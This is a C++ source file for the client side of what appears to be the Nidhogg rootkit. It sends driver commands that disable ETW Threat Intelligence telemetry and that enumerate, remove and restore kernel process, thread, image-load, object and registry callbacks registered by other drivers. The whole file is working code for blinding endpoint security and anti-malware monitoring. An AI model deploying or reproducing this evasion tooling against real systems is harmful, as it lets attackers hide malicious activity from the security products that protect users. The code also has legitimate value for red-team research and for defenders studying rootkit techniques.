#include "pch.h"
#include "AntiAnalysisHandler.h"

/*
* Description:
* HandleCommand is responsible for handling an anti analysis related command.
*
* Parameters:
* @command [_In_ std::string] -- The command to be handled.
*
* Returns:
* There is no return value.
*/
void AntiAnalysisHandler::HandleCommand(_In_ std::string command) {
	std::vector<std::string> params = SplitStringBySpace(command);
	std::string commandName = params.at(0);
	params.erase(params.begin());

	if (commandName.compare("enable_etwti") == 0) {
		if (params.size() != 0) {
			std::cerr << "Invalid usage" << std::endl;
			PrintHelp();
			return;
		}
		if (!EnableDisableEtwTi(true)) {
			std::cerr << "Failed to enable ETW-TI" << std::endl;
			return;
		}
		std::cout << "ETW-TI enabled successfully" << std::endl;
	}
	else if (commandName.compare("disable_etwti") == 0) {
		if (params.size() != 0) {
			std::cerr << "Invalid usage" << std::endl;
			PrintHelp();
			return;
		}
		if (!EnableDisableEtwTi(false)) {
			std::cerr << "Failed to disable ETW-TI" << std::endl;
			return;
		}
		std::cout << "ETW-TI disabled successfully" << std::endl;
	}
	else if (commandName.compare("remove_callback") == 0) {
		DWORD64 callbackAddress = 0;

		if (params.size() != 2) {
			std::cerr << "Invalid usage" << std::endl;
			PrintHelp();
			return;
		}
		try {
			callbackAddress = ConvertToNumber<std::string, DWORD64>(params.at(0));
		}
		catch (const ConvertorException& e) {
			std::cerr << e.what() << std::endl;
			PrintHelp();
			return;
		}
		if (callbackTypeMap.find(params.at(1)) == callbackTypeMap.end()) {
			std::cerr << "Invalid callback type" << std::endl;
			PrintHelp();
			return;
		}

		if (!IsValidKmMemory(callbackAddress)) {
			std::cerr << "Invalid callback address" << std::endl;
			PrintHelp();
			return;
		}
		if (!RemoveCallback(callbackAddress, callbackTypeMap.at(params.at(1)), true)) {
			std::cerr << "Failed to remove callback 0x" << std::hex << callbackAddress << " of type " << params.at(1) << std::endl;
			std::cout << std::dec << std::endl;
			return;
		}
		std::cout << "Callback 0x" << std::hex << callbackAddress << " of type " << params.at(1) << " removed successfully" << std::endl;
		std::cout << std::dec << std::endl;
	}
	else if (commandName.compare("restore_callback") == 0) {
		DWORD64 callbackAddress = 0;

		if (params.size() != 2) {
			std::cerr << "Invalid usage" << std::endl;
			PrintHelp();
			return;
		}
		try {
			callbackAddress = ConvertToNumber<std::string, DWORD64>(params.at(0));
		}
		catch (const ConvertorException& e) {
			std::cerr << e.what() << std::endl;
			PrintHelp();
			return;
		}
		if (callbackTypeMap.find(params.at(1)) == callbackTypeMap.end()) {
			std::cerr << "Invalid callback type" << std::endl;
			PrintHelp();
			return;
		}

		if (!IsValidKmMemory(callbackAddress)) {
			std::cerr << "Invalid callback address" << std::endl;
			PrintHelp();
			return;
		}
		if (!RemoveCallback(callbackAddress, callbackTypeMap.at(params.at(1)), false)) {
			std::cerr << "Failed to restore callback 0x" << std::hex << callbackAddress << " of type " << params.at(1) << std::endl;
			std::cout << std::dec << std::endl;
			return;
		}
		std::cout << "Callback 0x" << std::hex << callbackAddress << " of type " << params.at(1) << " restored successfully" << std::endl;
		std::cout << std::dec << std::endl;
	}
	else if (commandName.compare("list_disabled_callbacks") == 0) {
		if (!params.empty()) {
			PrintHelp();
			return;
		}

		std::vector<IoctlDisabledCallbackEntry> callbacks;
		try {
			callbacks = ListDisabledCallbacks();
		}
		catch (const AntiAnalysisHandlerException& e) {
			std::cerr << e.what() << std::endl;
			return;
		}
		catch (const std::bad_alloc&) {
			std::cerr << "Failed to allocate disabled callback list" << std::endl;
			return;
		}

		if (callbacks.empty()) {
			std::cout << "No disabled callbacks" << std::endl;
			return;
		}

		std::cout << "Disabled callbacks:" << std::endl;
		for (const auto& callback : callbacks) {
			const char* typeName = "Unknown";
			switch (callback.Type) {
			case ObProcessType: typeName = "ObProcessType"; break;
			case ObThreadType: typeName = "ObThreadType"; break;
			case PsCreateProcessTypeEx: typeName = "PsCreateProcessTypeEx"; break;
			case PsCreateProcessType: typeName = "PsCreateProcessType"; break;
			case PsCreateThreadType: typeName = "PsCreateThreadType"; break;
			case PsCreateThreadTypeNonSystemThread: typeName = "PsCreateThreadTypeNonSystemThread"; break;
			case PsImageLoadType: typeName = "PsImageLoadType"; break;
			case CmRegistryType: typeName = "CmRegistryType"; break;
			}
			std::cout << "\tType: " << typeName << ", Address: 0x" << std::hex
				<< callback.CallbackAddress << std::dec << std::endl;
		}
	}
	else if (commandName.compare("list_registry_callbacks") == 0) {
		IoctlCallbackList<CmCallback> callbacks;
		CmCallback currentCallback;

		if (params.size() != 0) {
			PrintHelp();
			return;
		}
		
		try {
			callbacks = ListRegistryCallbacks();
		}
		catch (const AntiAnalysisHandlerException& e) {
			std::cerr << e.what() << std::endl;
			return;
		}

		if (callbacks.Count == 0) {
			std::cerr << "No registry callbacks found or failed to list them" << std::endl;
			return;
		}
		std::cout << "Registry Callbacks:" << std::endl;

		for (ULONG i = 0; i < callbacks.Count; i++) {
			currentCallback = callbacks.Callbacks[i];

			if (strlen(currentCallback.DriverName) > 0)
				std::cout << "Driver Name: " << currentCallback.DriverName << std::endl;
			else
				std::cout << "Driver Name: Unknown" << std::endl;
			std::cout << "\tCallback: " << std::hex << currentCallback.CallbackAddress << std::endl;
			std::cout << "\tContext: " << std::hex << currentCallback.Context << std::endl;
		}
		std::cout << std::dec << std::endl;
		SafeFree(callbacks.Callbacks);
	}
	else if (commandName.compare("list_ob_callbacks") == 0) {
		IoctlCallbackList<ObCallback> callbacks;

		if (params.size() != 1) {
			PrintHelp();
			return;
		}
		if (!params.at(0).starts_with("Ob") || callbackTypeMap.find(params.at(0)) == callbackTypeMap.end()) {
			std::cerr << "Invalid callback type" << std::endl;
			PrintHelp();
			return;
		}
		try {
			callbacks = ListObCallbacks(callbackTypeMap.at(params.at(0)));
		}
		catch (const AntiAnalysisHandlerException& e) {
			std::cerr << e.what() << std::endl;
			return;
		}

		if (callbacks.Count == 0) {
			std::cerr << "No object callbacks found or failed to list them" << std::endl;
			return;
		}
		std::cout << "Object callbacks of type " << params.at(0) << ":" << std::endl;

		for (ULONG i = 0; i < callbacks.Count; ++i) {
			if (strlen(callbacks.Callbacks[i].DriverName) > 0)
				std::cout << "Driver Name: " << callbacks.Callbacks[i].DriverName << std::endl;
			else
				std::cout << "Driver Name: Unknown" << std::endl;
			std::cout << "\tPre Operation Callback: " << std::hex << callbacks.Callbacks[i].PreOperation << std::endl;
			std::cout << "\tPost Operation Callback: " << std::hex << callbacks.Callbacks[i].PostOperation << std::endl;
		}
		std::cout << std::dec << std::endl;
		SafeFree(callbacks.Callbacks);
	}
	else if (commandName.compare("list_ps_routines") == 0) {
		IoctlCallbackList<PsRoutine> routines;

		if (params.size() != 1) {
			PrintHelp();
			return;
		}
		if (!params.at(0).starts_with("Ps") || callbackTypeMap.find(params.at(0)) == callbackTypeMap.end()) {
			std::cerr << "Invalid callback type" << std::endl;
			PrintHelp();
			return;
		}
		try {
			routines = ListPsRoutines(callbackTypeMap.at(params.at(0)));
		}
		catch (const AntiAnalysisHandlerException& e) {
			std::cerr << e.what() << std::endl;
			return;
		}

		if (routines.Count == 0) {
			std::cerr << "No PS routines found or failed to list them" << std::endl;
			return;
		}
		std::cout << "PS routines of type " << params.at(0) << ":" << std::endl;

		for (ULONG i = 0; i < routines.Count; ++i) {
			
			if (strlen(routines.Callbacks[i].DriverName) > 0)
				std::cout << "Driver Name: " << routines.Callbacks[i].DriverName << std::endl;
			else
				std::cout << "Driver Name: Unknown" << std::endl;
			std::cout << "\tRoutine: " << std::hex << routines.Callbacks[i].CallbackAddress << std::endl;
		}
		std::cout << std::dec << std::endl;
		SafeFree(routines.Callbacks);
	}
	else {
		std::cerr << "Unknown command: " << commandName << std::endl;
		PrintHelp();
		return;
	}
}

/*
* Description:
* EnableDisableEtwTi is responsible for enabling or disabling ETW-TI.
* 
* Parameters:
* @enable [_In_ bool] -- Whether to enable or disable ETW-TI.
* 
* Returns:
* @bool				  -- Whether the operation was successful or not.
*/
bool AntiAnalysisHandler::EnableDisableEtwTi(_In_ bool enable) {
	DWORD returned = 0;
	return DeviceIoControl(*hNidhogg.get(), IOCTL_ENABLE_DISABLE_ETWTI, &enable, sizeof(enable), nullptr, 0, &returned, nullptr);
}

/*
* Description:
* RemoveCallback is responsible for removing or restoring a callback.
* 
* Parameters:
* @callbackAddress [_In_ ULONG64]	   -- The address of the callback to be removed or restored.
* @callbackType	   [_In_ CallbackType] -- The type of the callback to be removed or restored.
* @remove		   [_In_ bool]		   -- Whether to remove or restore the callback.
* 
* Returns:
* @bool								   -- Whether the operation was successful or not.
*/
bool AntiAnalysisHandler::RemoveCallback(_In_ ULONG64 callbackAddress, _In_ CallbackType callbackType, _In_ bool remove) {
	IoctlKernelCallback callback{};
	DWORD returned = 0;

	callback.CallbackAddress = callbackAddress;
	callback.Type = callbackType;
	callback.Remove = remove;
	return DeviceIoControl(*hNidhogg.get(), IOCTL_REMOVE_RESTORE_CALLBACK, &callback, sizeof(callback), nullptr, 0, &returned, nullptr);
}

/*
* Description:
* ListDisabledCallbacks retrieves the callbacks currently disabled by the driver.
*
* Parameters:
* There are no parameters.
*
* Returns:
* @callbacks [std::vector<IoctlDisabledCallbackEntry>] -- Callback types and addresses.
*/
std::vector<IoctlDisabledCallbackEntry> AntiAnalysisHandler::ListDisabledCallbacks() {
	constexpr SIZE_T headerSize = sizeof(SIZE_T);
	static_assert(offsetof(IoctlDisabledCallbackList, Callbacks) == headerSize);
	static_assert(headerSize == sizeof(unsigned long long));
	static_assert(sizeof(IoctlDisabledCallbackEntry) % sizeof(unsigned long long) == 0);
	static_assert(alignof(IoctlDisabledCallbackEntry) <= alignof(unsigned long long));
	SIZE_T requiredCount = 0;
	DWORD returned = 0;

	if (!DeviceIoControl(*hNidhogg.get(), IOCTL_LIST_DISABLED_CALLBACKS, nullptr, 0,
		&requiredCount, static_cast<DWORD>(headerSize), &returned, nullptr) || returned != headerSize)
		throw AntiAnalysisHandlerException("Failed to list disabled callbacks");

	for (int attempt = 0; attempt < 3; ++attempt) {
		if (requiredCount == 0)
			return {};
		if (requiredCount > (static_cast<SIZE_T>(MAXDWORD) - headerSize) / sizeof(IoctlDisabledCallbackEntry))
			throw AntiAnalysisHandlerException("Disabled callback list is too large");

		const SIZE_T bufferSize = headerSize + requiredCount * sizeof(IoctlDisabledCallbackEntry);
		std::vector<unsigned long long> buffer(bufferSize / sizeof(unsigned long long));
		auto response = reinterpret_cast<IoctlDisabledCallbackList*>(buffer.data());
		returned = 0;
		if (!DeviceIoControl(*hNidhogg.get(), IOCTL_LIST_DISABLED_CALLBACKS, nullptr, 0,
			response, static_cast<DWORD>(bufferSize), &returned, nullptr) || returned < headerSize)
			throw AntiAnalysisHandlerException("Failed to list disabled callbacks");

		if (response->Count > requiredCount) {
			if (returned != headerSize)
				throw AntiAnalysisHandlerException("Invalid disabled callback response");
			requiredCount = response->Count;
			continue;
		}
		if (returned != headerSize + response->Count * sizeof(IoctlDisabledCallbackEntry))
			throw AntiAnalysisHandlerException("Invalid disabled callback response");

		return { response->Callbacks, response->Callbacks + response->Count };
	}

	throw AntiAnalysisHandlerException("Disabled callback list changed during query");
}

/*
* Description:
* ListRegistryCallbacks is responsible for listing all registry callbacks.
* 
* Parameters:
* There are no parameters.
* 
* Returns:
* @callbacks [IoctlCallbackList<CmCallback>] -- A list of registry callbacks.
*/
IoctlCallbackList<CmCallback> AntiAnalysisHandler::ListRegistryCallbacks() {
	IoctlCallbackList<CmCallback> callbacks{};
	callbacks.Count = 0;
	DWORD returned = 0;

	if (!DeviceIoControl(*hNidhogg.get(), IOCTL_LIST_REGCALLBACKS, &callbacks, sizeof(callbacks), &callbacks, 
		sizeof(callbacks), &returned, nullptr)) {
		throw AntiAnalysisHandlerException("Failed to list registry callbacks");
	}

	if (callbacks.Count > 0) {
		try {
			callbacks.Callbacks = SafeAlloc<CmCallback*>(callbacks.Count * sizeof(CmCallback));
		}
		catch (const SafeMemoryException& e) {
			throw AntiAnalysisHandlerException(e.what());
		}
		if (!DeviceIoControl(*hNidhogg.get(), IOCTL_LIST_REGCALLBACKS, &callbacks, sizeof(callbacks), &callbacks,
			sizeof(callbacks), &returned, nullptr)) {
			SafeFree(callbacks.Callbacks);
			throw AntiAnalysisHandlerException("Failed to list registry callbacks");
		}
	}
	return callbacks;
}

/*
* Description:
* ListObCallbacks is responsible for listing all object callbacks of a specific type.
* 
* Parameters:
* @callbackType [_In_ CallbackType] -- The type of object callbacks to be listed.
* 
* Returns:
* @callbacks [IoctlCallbackList<ObCallback>] -- A list of object callbacks.
*/
IoctlCallbackList<ObCallback> AntiAnalysisHandler::ListObCallbacks(_In_ CallbackType callbackType) {
	IoctlCallbackList<ObCallback> callbacks{};
	DWORD returned = 0;
	callbacks.Type = callbackType;
	callbacks.Count = 0;

	if (!DeviceIoControl(*hNidhogg.get(), IOCTL_LIST_OBCALLBACKS, &callbacks, sizeof(callbacks), &callbacks, 
		sizeof(callbacks), &returned, nullptr))
		throw AntiAnalysisHandlerException("Failed to list object callbacks");

	if (callbacks.Count > 0) {
		try {
			callbacks.Callbacks = SafeAlloc<ObCallback*>(callbacks.Count * sizeof(ObCallback));
		}
		catch (const SafeMemoryException& e) {
			throw AntiAnalysisHandlerException(e.what());
		}
		if (!DeviceIoControl(*hNidhogg.get(), IOCTL_LIST_OBCALLBACKS, &callbacks, sizeof(callbacks), &callbacks, 
			sizeof(callbacks), &returned, nullptr)) {
			SafeFree(callbacks.Callbacks);
			throw AntiAnalysisHandlerException("Failed to list object callbacks");
		}
	}
	return callbacks;
}

/*
* Description:
* ListPsRoutines is responsible for listing all PS routines of a specific type.
* 
* Parameters:
* @callbackType [_In_ CallbackType] -- The type of PS routines to be listed.
* 
* Returns:
* @callbacks [IoctlCallbackList<PsRoutine>] -- A list of PS routines.
*/
IoctlCallbackList<PsRoutine> AntiAnalysisHandler::ListPsRoutines(_In_ CallbackType callbackType) {
	IoctlCallbackList<PsRoutine> routines{};
	routines.Type = callbackType;
	DWORD returned = 0;

	if (!DeviceIoControl(*hNidhogg.get(), IOCTL_LIST_PSROUTINES, &routines, sizeof(routines), &routines, 
		sizeof(routines), &returned, nullptr)) {
		throw AntiAnalysisHandlerException("Failed to list ps routines");
	}

	if (routines.Count > 0) {
		try {
			routines.Callbacks = SafeAlloc<PsRoutine*>(routines.Count * sizeof(PsRoutine));
		}
		catch (const SafeMemoryException& e) {
			throw AntiAnalysisHandlerException(e.what());
		}
		if (!DeviceIoControl(*hNidhogg.get(), IOCTL_LIST_PSROUTINES, &routines, sizeof(routines), &routines,
			sizeof(routines), &returned, nullptr)) {
			SafeFree(routines.Callbacks);
			throw AntiAnalysisHandlerException("Failed to list ps routines");
		}
	}
	return routines;
}
